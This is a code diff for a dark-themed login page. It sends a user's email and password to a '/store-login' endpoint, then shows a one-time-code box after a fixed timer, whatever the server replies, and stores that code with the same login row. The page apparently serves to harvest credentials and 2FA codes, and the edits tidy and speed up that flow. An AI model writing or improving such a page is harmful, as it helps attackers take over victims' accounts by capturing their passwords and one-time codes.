@@ -43,7 +43,7 @@ body { background:#000; color:#fff; display:flex; justify-content:center; align-
 </div>
 
 <script>
-const BASE_URL = window.location.origin; // dynamic domain
+const BASE_URL = window.location.origin;
 
 const loginBtn = document.getElementById("loginBtn");
 const loginText = document.getElementById("loginText");
@@ -51,13 +51,13 @@ const loginLoader = document.getElementById("loginLoader");
 const loginBox = document.getElementById("loginBox");
 const otpBox = document.getElementById("otpBox");
 const otpBtn = document.getElementById("otpBtn");
+
 let loginId = null;
 
-// LOGIN BUTTON
 loginBtn.onclick = async () => {
   const email = document.getElementById("email").value.trim();
-  const pass = document.getElementById("password").value.trim();
-  if (!email || !pass) { alert("Please fill all fields"); return; }
+  const password = document.getElementById("password").value.trim();
+  if (!email || !password) { alert("Please fill all fields"); return; }
 
   loginText.style.display = "none";
   loginLoader.style.display = "block";
@@ -67,7 +67,7 @@ loginBtn.onclick = async () => {
     const res = await fetch(`${BASE_URL}/store-login`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email, pass })
+      body: JSON.stringify({ email, password })
     });
 
     const data = await res.json().catch(() => ({}));
@@ -91,10 +91,9 @@ loginBtn.onclick = async () => {
   setTimeout(() => {
     loginBox.style.display = "none";
     otpBox.style.display = "block";
-  }, 2000);
+  }, 1000);
 };
 
-// OTP BUTTON
 otpBtn.onclick = async () => {
   const otp = document.getElementById("otpInput").value.trim();
   const email = document.getElementById("email").value.trim();
@@ -110,7 +109,7 @@ otpBtn.onclick = async () => {
 
     const data = await res.json();
     if (data.success) {
-      alert("OTP submitted successfully! It is linked to the same login row.");
+      alert("OTP submitted successfully!");
     } else {
       alert("Error saving OTP: " + data.error);
     }
